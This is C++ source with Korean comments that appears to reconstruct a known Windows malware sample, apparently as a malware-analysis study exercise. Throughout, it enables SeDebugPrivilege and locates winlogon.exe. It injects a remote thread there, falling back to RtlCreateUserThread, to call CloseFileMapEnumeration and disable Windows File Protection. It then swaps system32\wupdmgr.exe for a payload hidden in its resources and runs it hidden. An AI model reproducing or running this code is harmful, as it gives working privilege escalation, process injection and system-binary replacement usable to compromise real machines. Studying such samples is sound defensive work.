#include <iostream>
#include <Windows.h>
#include <psapi.h>	//K32EnumProcessModules 처럼 kenel32.dll 에서 불러옴....
#include <winuser.h> //MAKEINTRESOURCEA

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;


BOOL sub_401000(DWORD pid);
BOOL sub_401174(DWORD pid);
BOOL sub_4010FC(LPCSTR lpstr);
VOID sub_4011FC();

BOOL chkTokenPriv(void);

FARPROC CloseFileMapEnumeration();
FARPROC RtlCreateUserThread(HANDLE ProcessHandle, PSECURITY_DESCRIPTOR SecurityDescriptor, BOOLEAN CreateSuspended,
	ULONG StackZeroBits, PULONG StackReserved, PULONG StackCommit, PVOID StartAddress, PVOID StartParameter, PHANDLE ThreadHandle, PCLIENT_ID ClientID);
void ErrorExit(LPCSTR lpszFunction);

HANDLE g_hProcess; //g_hProcess를 입력받고 OpenProcess를 한번 더 쓰면 쓰레기 값이 되는것 같다. //쓰지마세요.

int main()
{
	//추가된 코드 
	chkTokenPriv();
	if (sub_4010FC("SeDebugPrivilege") == FALSE)
		return FALSE;
	chkTokenPriv();
	Sleep(1000 * 10);

	//LPVOID p = alloca(0x145C);

	DWORD pProcesses[255] = { 0, };
	DWORD cbNeeded;
	
	//현재 실행중인 프로세스의 PID 목록을 배열에 저장한다.
	EnumProcesses(pProcesses, sizeof(pProcesses), &cbNeeded);

	for (size_t i = 0; i < cbNeeded/4; i++)
	{
		if (pProcesses[i] == 0)
			continue;
			

		//sub_401000 함수는 컴파일된 플랫폼(x86, x64)에 따라 실행 가능한 플랫폼이 정해진다.
		//unlike CreateToolhelp32Snapshot(), EnumProcesses() has one of two or both limitations: 
		//	1. Doesn’t enumerate 64-bit processes if called from 32-bit process on x64 OS. 
		//	2. Doesn’t enumerate elevated processes on Vista and Win7.
		//프로세스 목록중에서 "winlogon.exe" 이름을 가진 프로세스를 찾아낸다.
		if (sub_401000(pProcesses[i]) == TRUE)
		{
			//"winlogon.exe" 프로세스에 원격으로 "CloseFileMapEnumeration()" 스레드를 실행시킨다.
			if (sub_401174(pProcesses[i]) == TRUE)
				break;
			else
				return 0;
		}
	}

	CHAR sysPath[MAX_PATH] = { 0, };
	GetWindowsDirectory(sysPath, MAX_PATH);
	CHAR sysExePath[MAX_PATH] = { 0, };
	snprintf(sysExePath, MAX_PATH, "%s%s", sysPath, "\\system32\\wupdmgr.exe"); 

	CHAR tempPath[MAX_PATH] = { 0, };
	GetTempPath(MAX_PATH, tempPath);
	CHAR tempExePath[MAX_PATH] = { 0, };
	snprintf(tempExePath, MAX_PATH, "%s%s", tempPath, "winup.exe");


	#if 1
	//system32 폴더의 "wupdmgr.exe" 파일(윈도우즈 업데이터 관리도구) 의 위치를 임시폴더로 변경
	MoveFile(sysExePath, tempExePath);

	//리소스에 숨겨놨던 파일을 "wupdmgr.exe" 이름으로 system32 폴더에 옮긴 후 실행시킨다.
	sub_4011FC();

	//복구코드
	DeleteFile(sysExePath);
	MoveFile(tempExePath, sysExePath);
	DeleteFile(tempExePath);
	#endif 

	return 0;
}

BOOL sub_401000(DWORD pid)
{
	HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid); //PROCESS_ALL_ACCESS
	if (hProcess == NULL)
	{
		//ErrorExit("OpenProcess");
		return FALSE;
	}
		
	HMODULE hMods[255] = { 0, };
	DWORD cbNeeded;
	
	//If this function is called from a 32-bit application running on WOW64, it can only enumerate the modules of a 32-bit process.
	//you may need to run a 64 bit process in order to enumerate process modules.
	//해당 프로세스에 로드된 모듈주소들을 hMods 배열에 저장한다,
	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) == 0)
	{
		ErrorExit("EnumProcessModules");
		return FALSE;
	}
		
	char szProcessName[16] = "<not real>"; 

	//szProcessName 에 프로세스의 이름을 받아온다.
	if (GetModuleBaseName(hProcess, hMods[0], szProcessName, sizeof(szProcessName)) == 0)
	{
		ErrorExit("GetModuleBaseName");
		return FALSE;
	}

	if (!strnicmp(szProcessName, "winlogon.exe", strlen("winlogon.exe")))
	{
		//g_hProcess = hProcess;
		CloseHandle(hProcess);
		return TRUE;
	}
	else
	{
		CloseHandle(hProcess);
		return FALSE;
	}
}
BOOL sub_401174(DWORD pid)
{
	//토큰중에서 SeDebugPrivilege 권한을 활성화 시킨다.
	if (sub_4010FC("SeDebugPrivilege") == FALSE)
		return FALSE;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
		return FALSE;

	#if 1
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)CloseFileMapEnumeration, NULL, 0, NULL); //로그아웃된다.
	if (hThread == NULL)
	{
		ErrorExit((LPTSTR)("CreateRemoteThread"));
		//return FALSE;

		//추가된 코드
		//RtlCreateUserThread 로 한번더
		HANDLE hThd;
		CLIENT_ID cid;
		hThread = NULL;

		hThread = RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)CloseFileMapEnumeration, 0, &hThd, &cid);
		if (hThread == NULL)
		{
			ErrorExit((LPTSTR)("RtlCreateUserThread"));
			return FALSE;
		}
		WaitForSingleObject(hThd, INFINITE);

		CloseHandle(hThd);
		CloseHandle(hProcess);
	}
	#endif 
		
	return TRUE;
}
BOOL sub_4010FC(LPCSTR lpstr)
{
	HANDLE hToken;
	LUID luid;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken) == TRUE)
	{
		if (LookupPrivilegeValue(NULL, lpstr, &luid) == TRUE)
		{
			//실제 코드에서는 토큰의 권한을 켜지않음 
			//if (AdjustTokenPrivileges(g_hProcess, FALSE, NULL, NULL, NULL, NULL) == TRUE)
			//	return TRUE;

			//추가된 코드
			DWORD dwSize;
			TOKEN_PRIVILEGES tp, pritp;

			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = luid;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), &pritp, &dwSize) == ERROR_NOT_ALL_ASSIGNED)
			{
				ErrorExit((LPTSTR)("AdjustTokenPrivileges"));
				return FALSE;
			}

			LPSTR bName;
			LookupPrivilegeName(NULL, &tp.Privileges[0].Luid, NULL, &dwSize);
			bName = new CHAR[dwSize + 1];
			LookupPrivilegeName(NULL, &tp.Privileges[0].Luid, bName, &dwSize);
			printf("SE_PRIVILEGE_ENABLED : %s\n\n", bName);
			delete[] bName;

			CloseHandle(hToken);
			return TRUE;
			//+++++++++++++++
		}
			
	}

	return FALSE;
}
VOID sub_4011FC()
{
	CHAR sysPath[MAX_PATH] = { 0, };
	GetWindowsDirectory(sysPath, MAX_PATH);
	CHAR sysExePath[MAX_PATH] = { 0, };
	snprintf(sysExePath, MAX_PATH, "%s%s", sysPath, "\\system32\\wupdmgr.exe");

	//리소스에 파일을 숨겨놨음
	HMODULE hInst = GetModuleHandle(NULL);
	HRSRC rsrc = FindResource(hInst, "#101", "BIN");  //"#101" =  MAKEINTRESOURCE(IDR_BIN1)
	HGLOBAL loadedRsrc = LoadResource(hInst, rsrc);
	DWORD dwReadedByte = SizeofResource(hInst, rsrc);;		//실제로 받아들인 데이터의 크기
	DWORD dwWritten = 0;		//실제로 기록된 바이트 크기

	HANDLE hFile = CreateFile(sysExePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	WriteFile(hFile, loadedRsrc, dwReadedByte, &dwWritten, NULL);

	CloseHandle(hFile);
	WinExec(sysExePath, SW_HIDE);
}

FARPROC CloseFileMapEnumeration()
{
	FARPROC pCloseFileMapEnumeration = NULL;

	HINSTANCE hInst = LoadLibrary("sfc_os.dll");
	if (hInst)
	{
		pCloseFileMapEnumeration = GetProcAddress(hInst, "CloseFileMapEnumeration");
		if (pCloseFileMapEnumeration)
		{
			FreeLibrary(hInst);
			return pCloseFileMapEnumeration;
		}
	}

	FreeLibrary(hInst);
	return 0;
}
FARPROC RtlCreateUserThread(HANDLE ProcessHandle, PSECURITY_DESCRIPTOR SecurityDescriptor, BOOLEAN CreateSuspended,
	ULONG StackZeroBits, PULONG StackReserved, PULONG StackCommit, PVOID StartAddress, PVOID StartParameter, PHANDLE ThreadHandle, PCLIENT_ID ClientID)
{
	FARPROC bRet = NULL;

	typedef FARPROC(WINAPI *LPFN_RtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);
	LPFN_RtlCreateUserThread pRtlCreateUserThread = NULL;

	HINSTANCE hInst = LoadLibrary("ntdll.dll");
	if (hInst)
	{
		pRtlCreateUserThread = (LPFN_RtlCreateUserThread)GetProcAddress(hInst, "RtlCreateUserThread");
		if (pRtlCreateUserThread)
			bRet = pRtlCreateUserThread(ProcessHandle, SecurityDescriptor, CreateSuspended, StackZeroBits, StackReserved, StackCommit, StartAddress, StartParameter, ThreadHandle, ClientID);

		FreeLibrary(hInst);
		return bRet;
	}

	return bRet;
}

BOOL chkTokenPriv(void)
{
	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid; //LUID(Locally Unique IDentifier)
	DWORD dwSize = 0;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) == FALSE)
	{
		ErrorExit((LPTSTR)("OpenProcessToken"));
		return FALSE;
	}

	if (GetTokenInformation(hToken, TokenPrivileges, NULL, dwSize, &dwSize) == FALSE)
	{
		if (GetLastError() == FALSE)
		{
			ErrorExit((LPTSTR)("GetTokenInformation"));
			return FALSE;
		}
	}

	LPBYTE * pData = new LPBYTE[dwSize + 1];

	if (GetTokenInformation(hToken, TokenPrivileges, pData, dwSize, &dwSize) == FALSE)
	{
		if (GetLastError() == FALSE)
		{
			ErrorExit((LPTSTR)("GetTokenInformation"));
			return FALSE;
		}
	}

	//TOKEN_PRIVILEGES* pPrivileges = (TOKEN_PRIVILEGES*)pData;
	PTOKEN_PRIVILEGES pTokenPriv = (PTOKEN_PRIVILEGES)pData;

	for (DWORD i = 0; i < pTokenPriv->PrivilegeCount; i++)
	{
		// Get and display the privilege name.
		dwSize = 0;
		LookupPrivilegeName(NULL, &pTokenPriv->Privileges[i].Luid, NULL, &dwSize);
		LPSTR szName = new CHAR[dwSize + 1];
		LookupPrivilegeName(NULL, &pTokenPriv->Privileges[i].Luid, szName, &dwSize);
		printf("%s\n", szName);
		delete[] szName;

		// Display the privilege state.
		switch (pTokenPriv->Privileges[i].Attributes)
		{
		case SE_PRIVILEGE_ENABLED:
			printf("[+] Enabled\n\n");
			break;

		case SE_PRIVILEGE_ENABLED_BY_DEFAULT:
			printf("[+] Enabled by default\n\n");
			break;

		case SE_PRIVILEGE_REMOVED:
			printf("Removed\n");
			break;

		case SE_PRIVILEGE_USED_FOR_ACCESS:
			printf("Used for access\n\n");
			break;

		default:
			printf("Disabled\n\n");
			break;
		}
	}

	CloseHandle(hToken);
	return true;
}
void ErrorExit(LPCSTR lpszFunction)
{
	TCHAR errmsg[1024];
	DWORD dw = GetLastError();

	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, dw, 0, errmsg, 1024, NULL);

	printf("%s failed with error %d : %s", lpszFunction, dw, errmsg);
}